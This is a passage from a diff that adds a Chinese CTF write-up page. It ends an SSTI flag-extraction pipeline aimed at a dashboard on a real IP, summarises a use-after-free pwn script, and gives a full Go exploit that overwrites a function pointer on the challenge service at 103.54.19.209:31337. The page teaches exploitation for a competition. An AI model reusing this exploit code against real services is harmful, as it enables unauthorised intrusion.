+print(urllib.parse.urlencode({&quot;title&quot;: payload}))
+PY
+)&quot; \
+  http://103.54.19.209/dashboard.php | \
+python - &lt;&lt;&#39;PY&#39;
+import re,sys
+html=sys.stdin.read()
+m=re.search(r&quot;novruzctf\{[^}]+\}&quot;, html)
+print(m.group(0) if m else &quot;not found&quot;)
+PY
+</code></pre></div>
+<p>以上流程可在纯命令行环境完成登录、触发 SSTI、并抽取最终 Flag。</p>
+<h2 id="exploitpy-pwn">附：仓库中的 exploit.py 说明（独立 Pwn 脚本）<a class="headerlink" href="#exploitpy-pwn" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>说明：该脚本是仓库内的 Pwn 解题脚本，目标端口为 <code>103.54.19.209:31337</code>，与本 Web 题不同，但按你的要求记录其核心逻辑。</p>
+</blockquote>
+<p><code>exploit.py</code> 主要行为：
+1. 使用 <code>pwntools</code> 连接远端服务并进行菜单交互。
+2. 先 <code>add_egg</code> 再 <code>remove_egg</code>，制造可控的已释放对象。
+3. 构造 payload：<code>p64(WIN) + b'X'*8</code>，覆盖函数指针为 <code>WIN = 0x401335</code>。
+4. <code>add_note</code> 写入原始字节（含 <code>\x00</code>），随后 <code>view_egg</code> 触发 <code>win</code>。</p>
+<h2 id="go-exploitpy">Go 版本攻击脚本（与 exploit.py 等价逻辑）<a class="headerlink" href="#go-exploitpy" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>仅用于授权 CTF 环境。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="s">&quot;bufio&quot;</span>
+<span class="w">    </span><span class="s">&quot;bytes&quot;</span>
+<span class="w">    </span><span class="s">&quot;encoding/binary&quot;</span>
+<span class="w">    </span><span class="s">&quot;fmt&quot;</span>
+<span class="w">    </span><span class="s">&quot;net&quot;</span>
+<span class="p">)</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">HOST</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;103.54.19.209&quot;</span>
+<span class="w">    </span><span class="nx">PORT</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">31337</span>
+<span class="w">    </span><span class="nx">WIN</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="mh">0x401335</span>
+<span class="p">)</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">delim</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">line</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">ReadBytes</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">line</span><span class="p">,</span><span class="w"> </span><span class="nx">delim</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">sendLine</span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteString</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteByte</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">menu</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Choice:&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">sendLine</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">addEgg</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">strength</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">pattern</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">menu</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Owner name:&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">owner</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteByte</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Flush</span><span class="p">()</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Strength&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">sendLine</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">strength</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Egg pattern:&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">pattern</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteByte</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">viewEgg</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">idx</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">menu</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Egg index&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">sendLine</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">idx</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">removeEgg</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">idx</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">menu</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Egg index&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">sendLine</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">idx</span><span class="p">))</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">addNote</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">bufio</span><span class="p">.</span><span class="nx">Writer</span><span class="p">,</span><span class="w"> </span><span class="nx">judge</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">verdict</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">menu</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Judge name:&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">judge</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteByte</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Flush</span><span class="p">()</span>
+<span class="w">    </span><span class="nx">readUntil</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;Verdict:&quot;</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">verdict</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">WriteByte</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">Flush</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">conn</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Dial</span><span class="p">(</span><span class="s">&quot;tcp&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%s:%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">HOST</span><span class="p">,</span><span class="w"> </span><span class="nx">PORT</span><span class="p">))</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">defer</span><span class="w"> </span><span class="nx">conn</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+
+<span class="w">    </span><span class="nx">r</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">bufio</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">bufio</span><span class="p">.</span><span class="nx">NewWriter</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">addEgg</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Repeat</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="p">),</span><span class="w"> </span><span class="mi">8</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Repeat</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;B&quot;</span><span class="p">),</span><span class="w"> </span><span class="mi">8</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">removeEgg</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">buf</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">p64</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">binary</span><span class="p">.</span><span class="nx">LittleEndian</span><span class="p">.</span><span class="nx">PutUint64</span><span class="p">(</span><span class="nx">p64</span><span class="p">,</span><span class="w"> </span><span class="nx">WIN</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">buf</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span><span class="w"> </span><span class="nx">p64</span><span class="o">...</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">buf</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Repeat</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;X&quot;</span><span class="p">),</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="o">...</span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">addNote</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Repeat</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;J&quot;</span><span class="p">),</span><span class="w"> </span><span class="mi">8</span><span class="p">),</span><span class="w"> </span><span class="nx">buf</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">viewEgg</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+
+<span class="w">    </span><span class="c1">// 这里可以继续读取输出或交互</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="__comments">评论</h2>
+
+<script
+  src="https://giscus.app/client.js"
+  data-repo="your-username/your-repo"
+  data-repo-id=""
+  data-category="Writeup Comments"
+  data-category-id=""
+  data-mapping="pathname"
+  data-strict="1"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="top"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  data-loading="lazy"
+  crossorigin="anonymous"
+  async>
+</script>
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../javascripts/drawer-backdrop.js"></script>
+      
+    
+  </body>
+</html>
